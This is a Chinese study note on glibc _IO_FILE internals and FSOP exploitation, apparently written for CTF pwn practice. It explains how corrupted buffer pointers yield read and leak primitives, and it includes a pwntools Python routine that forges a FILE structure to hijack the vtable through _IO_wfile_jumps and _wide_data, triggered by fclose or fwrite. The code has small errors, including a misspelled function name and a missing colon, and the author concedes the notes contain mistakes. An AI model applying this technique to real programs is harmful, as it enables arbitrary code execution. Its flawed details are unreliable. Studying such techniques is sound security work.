文件结构 _IO_FILE：
- 注意，新旧文件结构不同
- 读取/写入一块数据到缓冲 buf
    - 读取
        - 到缓冲尾部仍未完全读取时，指针回到缓冲 buf 开头
        - 未到达缓冲尾部完全读取时，到达 eof
    - 写入
        - 写入到缓冲 buf，直到缓冲 buf 尾部时，刷新缓存实际存入文件，指针回到缓存 buf 开头
- 指针
    - base 起始
    - end 结尾
    - ptr 当前
- _fileno 文件描述符
- 位于用户区的堆而不是内核区

文件增强结构：
- 在文件结构末尾额外添加了一个虚表指针，指向虚表中的函数
    ```c
    struct _IO_FILE_plus
    {
        FILE file;
        const struct _IO_jump_t *vtable;
    };
    ```

读写原语：
- 覆盖，fread 读取时
    - _flags
    - _IO_buf_base 缓冲区基址
    - _IO_buf_end 缓冲区基址+长度
    - _IO_read_ptr = _IO_read_end 当前可用缓冲区为空，触发缓冲区重置
    - _IO_buf_end - _IO_buf_base 的**缓冲区大小** > 大于 fread 读长度，以触发缓存使用。否则不使用此块模拟缓存，无法覆盖目标地址
- 泄露，fwrite 写入时
    - _flags
    - _IO_write_base 写基址
    - _IO_write_ptr 写基址+长度
    - _IO_read_end = _IO_write_base 一致性
    - _IO_buf_end - _IO_buf_base >= 写长度
    - 第二次载荷大小匹配文件结构写入的长度
- 锁 *_lock 同步线程间访问，保存同步量
    - 确保指向有效可写地址
    - 值为0的无锁状态（加锁+，释放-）
    - 当 _flag 未置位 0x8000 时修改 +4 +8 偏移数据
- 文件增强结构的虚表指针
    - 一致性：检测指针指向任意虚表地址
    - 偏移

    - 篡改劫持：函数调用链中存在调用未进行虚表地址检测的函数调用
        - 引用链：file 结构的 vtable 虚表指针 ->  +0x38偏移的跳转虚表 -> file 的 _wide_data w结构指针 -> _wide_data 结构 +0xe0偏移处的 _wide_vtable w虚表指针 -> +0x68偏移 自定义函数地址
        1. `file.vtable` 保存通过验证的虚表指针
            - 设置 `_IO_wfile_jumps` 中对应 `IO_wfile_overflow` 函数指针的跳转表基址 +0x18 
            - 对于 fwrite -0x38 偏移
            - 对于 fclose -0x10 偏移
        2. 将调用不进行虚表检测的 `__GI__IO_wdoallocbuf`
        3. `file._wide_data` 保存w结构指针
            - 设置为保存w虚表指针 -0xe0 的w结构偏移
        4. w虚表指针
            - 设置为保存自定义函数地址的指针 -0x68偏移
        - _flags 字段：
            - 避开 0x2 __GI__IO_wdoallocbuf
            - 避开 0x8 _IO_wfile_overflow

        ```py
        def file_fuc_payload_build(fst_addr, IO_wfile_overflow_jumps, win_addr, tirgger_mod='fwrite', \
        flags=0, mod=0):
            """
            指针重叠在文件结构内
            fst_addr 文件结构基址
            IO_wfile_overflow_jumps 虚函数表中的 IO_wfile_overflow 函数指针所在地址
            win_addr 自定义函数
            trigger_mod 两种模式虚表偏移不同：fwrite 0x38, fclose 0x10
            """
            file_st = FileStructure() # pwntool 的旧版文件结构模板对象

            ## flags 置位的无锁操作，削弱对 rdi 字节的控制
            # file_st.flags = 0x8000 # 跳过 _lock 操作
            # 锁指向文件结构字段 __pad5 的空字节，位于 file+184 偏移，或任意空字节段
            # file_st._lock =  fst_addr +184 
            ## 有锁操作，设置 _lock 到未使用且未检测的字段，增加对 rdi 字节的控制
            file_st._lock =  fst_addr +72 # 锁设置到 _IO_save_base 字段

            file_st._IO_write_ptr = 0x2 # lockp 的 mod 分支测试

            # 虚表基址指针，偏移后对应目标虚表函数 IO_wfile_overflow
            if tirgger_mod == 'fclose': 
                vt_offset = 0x10
            elif tirgger_mod == 'fwrite':
                vt_offset = 0x38
            elif tirgger_mod == 'lockp':
                vt_offset = 0x18
            elif tirgger_mod == 'cleanup':
                vt_offset = 0x58
            file_st.vtable = IO_wfile_overflow_jumps - vt_offset

            # w结构指针，存放在 _unused2 +12，-0xe0 对应w结构偏移
            unused2_offset = 196
            file_st._wide_data = fst_addr + unused2_offset +12 -0xe0

            # 20字节的 unused2 字段存放重叠结构指针
            unused2_addr_payload = b''.join([   
                    p32(0), # +0，4字节填充
                    p64(win_addr), # +4处, 自定义函数指针
                    p64(fst_addr + unused2_offset +4 -0x68), # +12处, w虚表指针，自定义函数指针存放在 _unused2+0x4 处，-0x68对应w虚表偏移
                ])

            file_st_bytes = bytes(file_st)

            mod_offset = 192
            mod_bytes = int.to_bytes(mod, 4, 'little', signed=True) # _mod 字段 0 -1 或正数
            file_st_bytes = file_st_bytes[:mod_offset] + mod_bytes + file_st_bytes[mod_offset+4:] # 设置 mod 字段

            file_st_bytes = file_st_bytes[:unused2_offset] + unused2_addr_payload + file_st_bytes[unused2_offset+20:] # 设置 unused2 字段
            return file_st_bytes

        def hijack_vt_func(fst_addr, IO_wfile_overflow_jumps, win_addr, set_mod='fp', trigger_mod='fclose'):
            # 构造文件结构载荷
            payload_file_st = file_func_payload_build(fst_addr, IO_wfile_overflow_jumps, win_addr, trigger_mod=trigger_mod)

            if set_mod == 'io':
                # 若存在任意读写，劫持标准输出结构 fst_addr 为 IO_2_1_stdout 结构地址
                set_data(fst_addr, len(payload_file_st), payload_file_st)
            elif set_mod == "fp":
                # 若直接覆盖文件结构受控 fp
                write_fp(payload_file_st)      

                # 触发文件结构操作，使用 fclose 或 fwrite
                if trigger_mod == 'fclose'
                    close_file() 
                elif trigger_mod == 'fwrite'
                    write_file()
                    

        libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        libc_elf.address = leak_libc - leak_libc_offset
        IO_wfile_overflow_jumps = libc_elf.symbols['_IO_wfile_jumps']+0x18 # 基址偏移 +0x18
        ```

tips
- ❗ 或许某天使用反编译工具详细查看，并记录 FSOP 各字段的约束 ❗ 当前记录存在纰漏
- 标准输入输出使用缓冲，使用文件结构
- 标准输入输出的文件结构作为 libc 的全局对象，在 libc 地址泄露时使用相对偏移定位 `_IO_2_1_stdout_`
    - 注意覆盖后需避开使用缓存的函数调用，如 puts
- fclose 将在关闭文件结构时，触发文件结构输出缓存刷新 buf -> fp 以泄露
    - 同时将触发虚表函数调用，以进行函数劫持
- 退出的清理阶段拥有两个触发函数，对应不同偏移以及寄存器初值
- 核心在于不同文件处理函数使用相同文件结构字段的不同指：flag、mod、虚表基址的偏移
